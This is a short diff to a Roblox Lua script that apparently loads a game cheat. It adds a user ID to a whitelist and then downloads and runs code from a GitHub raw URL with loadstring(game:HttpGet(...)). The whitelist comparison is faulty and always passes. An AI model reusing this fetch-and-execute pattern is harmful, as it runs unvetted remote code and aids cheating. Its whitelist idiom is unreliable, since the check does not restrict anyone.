@@ -1,7 +1,7 @@
 local Player = game.Players.LocalPlayer.UserId
 
 --
-if Player == 3414918338 or 1497173687 or 529886802 or 3030543493 or 222072448 or 194067424 or 2343232258 or 2395676617 or 2343232258 or 448282261 then  -- evolve
+if Player == 3414918338 or 1497173687 or 529886802 or 3030543493 or 222072448 or 194067424 or 2343232258 or 2395676617 or 2343232258 or 2935660716 or 448282261 then  -- evolve
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BlackSkidder12/PiesGame/main/Main"))()
 else
 game.Players.LocalPlayer:Kick("You arent whitelisted to use this script.")
